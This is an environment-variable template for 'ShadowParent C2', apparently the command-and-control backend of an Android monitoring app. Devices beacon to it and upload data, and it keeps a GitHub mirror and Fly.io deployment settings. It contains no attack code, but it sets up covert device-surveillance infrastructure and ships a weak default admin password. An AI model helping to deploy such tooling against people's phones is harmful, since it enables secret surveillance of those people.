# ShadowParent C2 — Environment Variables
# Copy to .env and fill in your values

# ─── Dashboard (c2/) ──────────────────────────────────────────────
# Flask secret key for session encryption (generate: python -c "import secrets; print(secrets.token_hex(32))")
SECRET_KEY=

# Admin login for dashboard web UI
ADMIN_USER=admin
ADMIN_PASS=admin123

# API key for device communication (ingest, beacon, upload)
# Generate: python -c "import secrets; print('sk-xt-' + secrets.token_hex(24))"
API_KEY=

# Database — use PostgreSQL in production, SQLite for local dev
# Local: DB_PATH=/data/sp.db
# Production (Neon/Supabase/Fly Postgres): DATABASE_URL=postgresql://user:pass@host/db
DATABASE_URL=
DB_PATH=/data/sp.db

# File uploads directory
UPLOAD_DIR=/data/uploads

# ─── GitHub (for DB mirror / persistence) ────────────────────────
# GitHub Personal Access Token with repo scope
# Create at: https://github.com/settings/tokens
GH_TOKEN=

# GitHub repo for mirror (owner/name)
GH_REPO=palcinkoo/shadowparent-dashboard

# ─── Fly.io ──────────────────────────────────────────────────────
# Fly.io Personal Access Token (Read/Write)
# Create at: https://fly.io/user/personal_access_tokens
FLY_API_TOKEN=

# ─── Android Build ───────────────────────────────────────────────
# Keystore passwords for release signing (optional - falls back to debug)
SP_STORE_PASS=
SP_KEY_PASS=

# ─── APK Config (assets/c2.conf) ─────────────────────────────────
# Format: <base_url>|<api_key>
# Example: https://shadowparent-c2.fly.dev|sk-xt-abcdef123456
C2_CONF_URL=https://shadowparent-c2.fly.dev
C2_CONF_API_KEY=sk-xt-change-me
